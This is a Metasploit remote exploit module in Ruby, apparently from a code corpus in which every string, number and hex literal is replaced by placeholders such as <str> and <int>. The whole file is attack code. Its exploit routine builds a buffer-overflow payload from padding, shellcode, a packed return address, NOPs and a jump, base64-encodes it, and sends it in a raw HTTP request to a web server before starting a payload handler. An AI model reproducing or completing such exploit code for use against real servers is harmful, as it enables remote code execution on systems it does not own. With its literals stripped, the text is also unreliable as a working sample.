require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GreatRanking HttpFingerprint = { <str> = > [ <str> ] } include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > <str> , } , <str> = > true , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] , ] , <str> = > <int> , <str> = > <str> ) ) end def exploit sploit = rand_text_alpha_upper ( <int> - payload . encoded . length ) + payload . encoded sploit << [ target . ret ] . pack ( <str> ) + make_nops ( <int> ) + [ <hex> , - <int> ] . pack ( <str> ) sploit = Rex :: Text . encode_base64 ( sploit ) print_status ( <str> target . name <str> ) send_request_raw ( { <str> = > { <str> = > <str> sploit <str> } } , <int> ) handler disconnect end end 
